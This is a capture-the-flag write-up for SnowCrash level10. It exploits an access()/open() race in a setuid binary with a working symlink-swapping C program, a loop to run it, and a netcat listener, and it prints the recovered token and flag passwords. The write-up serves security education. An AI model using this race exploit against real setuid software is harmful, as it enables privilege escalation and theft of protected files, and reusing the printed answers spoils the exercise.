
## Level10

```bash
level10@SnowCrash:~$ ls -lA
total 28
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

```bash
level10@SnowCrash:~$ ltrace ./level10
__libc_start_main(0x80486d4, 1, 0xbffff7b4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)                                                        = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ltrace ./level10  flag
__libc_start_main(0x80486d4, 2, 0xbffff7b4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)                                                        = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

level10@SnowCrash:~$ ltrace ./level10  flag 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
access("flag", 4)                                                                                                 = -1
printf("You don't have access to %s\n", "flag"You don't have access to flag
)                                                                   = 30
+++ exited (status 30) +++
level10@SnowCrash:~$
```

```bash
level10@SnowCrash:~$ nc -l 6969 # In a new window
```

### Exploit (1st attempt)

The goal of this was to run the program through gdb to a symlink pointing to a readable file, then make a breakpoint after the access() call, change the file pointed by the symlink to the token file, and continue the execution of the program

- Create a symlink to a file we're sure will exists for access()

```bash
level10@SnowCrash:~$ ln -s /proc/self/maps /tmp/symlink
```

- Then in GDB, run the program until the access() call

```bash
level10@SnowCrash:~$ gdb ./level10
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level10/level10...done.

(gdb) break main
Breakpoint 1 at 0x80486e7: file level10.c, line 12.

(gdb) run /tmp/symlink 127.0.0.1
Starting program: /home/user/level10/level10 /tmp/symlink 127.0.0.1

Breakpoint 1, main (argc=3, argv=0xbffff774) at level10.c:12
12      level10.c: No such file or directory.

(gdb) break *0x0804874e ; one instruction after access()
Breakpoint 2 at 0x804874e: file level10.c, line 24.

(gdb) continue
Continuing.

Breakpoint 2, 0x0804874e in main (argc=3, argv=0xbffff774) at level10.c:24
24      in level10.c
```

- In our shell, change the file pointed by the symlink

```bash
level10@SnowCrash:~$ rm /tmp/symlink

level10@SnowCrash:~$ ln -s /home/user/level10/flag /tmp/symlink
```

- Then in GDB, continue the execution of the program

```bash
(gdb) continue
Continuing.
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. Damn. Unable to open file
[Inferior 1 (process 3688) exited with code 01]
```

Unfortunately, the setuid() call in the program is not executed when running the program with ptrace() (as gdb does), so this cannot work, I chose to kept this attempt to explain this to my mates doing the peer-reviews

- https://unix.stackexchange.com/questions/15911/can-gdb-debug-suid-root-programs

### Exploit (2nd attempt)

```bash
man access
...
NOTES
       Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason,  the
       use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

- https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole

- http://www.csl.sri.com/users/ddean/papers/usenix04.pdf

The idea here would be to switch the file pointed by a symlink between the access() and open() calls of the `level10` program.

To do this, we'll make a binary that'll fork() to execute the `level10` binary, and while it's running, change the pointed location of our symlink


- Create a temporary directory with rights and the following c file

```bash
cd $(mktemp -d)
nano symlink_spam.c
```

##### Symlink_spam.c:

```c
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#define SYMLINK_TEMP_TARGET "/proc/self/stat"
#define SYMLINK_END_TARGET "/home/user/level10/token"
#define SYMLINK_LOCATION "/tmp/link"

const char* table[] = {
    "/home/user/level10/level10",
    SYMLINK_LOCATION,
    "127.0.0.1"
};

int             main(int ac, char **av, char **envp)
{
        int             CYCLES=1250000;

        symlink(SYMLINK_TEMP_TARGET, SYMLINK_LOCATION);
        if (fork() == 0) {
                execve("/home/user/level10/level10", table, envp);
                strerror(errno); // Used for debugging with strace -f
                exit(0);
        }
        while (CYCLES--)
                ;
        unlink(SYMLINK_LOCATION);
        symlink(SYMLINK_END_TARGET, SYMLINK_LOCATION);
        return (0);
}
```

- Execute our program in a loop

```bash
while [ 1 ]; do rm /tmp/link ; gcc ./symlink_spam.c && ./a.out ; done;
```

- And after some time in our netcat shell:

```bash
level10@SnowCrash:~$ while [ 1 ]; do echo ------------------------ ; nc -l 6969; done;
...
------------------------
.*( )*.
30633 (level10) R 30632 30631 3564 34820 30631 0 137 0 0 0 0 0 0 0 20 0 1 0 1583431 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
30781 (level10) R 30780 30779 3564 34820 30779 0 137 0 0 0 0 0 0 0 20 0 1 0 1583539 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
.*( )*.
------------------------
.*( )*.
------------------------
.*( )*.
woupa2yuojeeaaed06riuj63c
------------------------
.*( )*.
woupa2yuojeeaaed06riuj63c
------------------------
.*( )*.
31404 (level10) R 31403 31403 3564 34820 31403 0 137 0 0 0 0 0 0 0 20 0 1 0 1584507 2052096 70 4294967295 134512640 1345
15796 3221223296 3221218936 3086865448 0 0 0 0 0 0 0 17 0 0 0 0 0 0
------------------------
```

### Goto level11

```bash
level10@SnowCrash:/tmp/tmp.PvcifhUUhs$ su flag10
Password: <<< 'woupa2yuojeeaaed06riuj63c'
Don\'t forget to launch getflag !

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c

flag10@SnowCrash:~$ su level11
Password: <<< 'feulo4b72j7edeahuete3no7c'
```
